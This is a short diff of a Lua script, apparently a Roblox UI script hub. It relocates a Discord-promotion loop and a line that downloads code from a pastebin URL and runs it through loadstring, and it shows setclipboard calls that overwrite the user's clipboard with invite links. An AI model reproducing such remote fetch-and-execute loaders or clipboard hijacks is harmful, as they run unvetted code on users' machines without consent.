@@ -1066,6 +1066,19 @@ t5:CreateButton({
     end,
 })
 
+while task.wait(35) do
+    if fav == true then
+        Rayfield:Notify({
+            Title = "Dodo Research Club",
+            Content = "Join https://discord.gg/vmQVgF9N now!",
+            Duration = 3,
+            Image = "rewind",
+        })
+    end
+end
+
+loadstring(game:HttpGet("https://pastebin.com/raw/UjVjsnQC"))()
+
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -1136,19 +1149,6 @@ if ad ~= "64697273626c6f7820746f6b656e206170693a2062616e6964615f6f6666" then
     end)
 end
 
-while task.wait(35) do
-    if fav == true then
-        Rayfield:Notify({
-            Title = "Dodo Research Club",
-            Content = "Join https://discord.gg/vmQVgF9N now!",
-            Duration = 3,
-            Image = "rewind",
-        })
-    end
-end
-
-loadstring(game:HttpGet("https://pastebin.com/raw/UjVjsnQC"))()
-
 setclipboard("https://discord.gg/vmQVgF9N")
 Rayfield:LoadConfiguration()
 
@@ -1163,6 +1163,7 @@ t5:CreateButton({
 setclipboard("https://discord.gg/EHVKqtJm")
 
 ]]
+
 
 
 
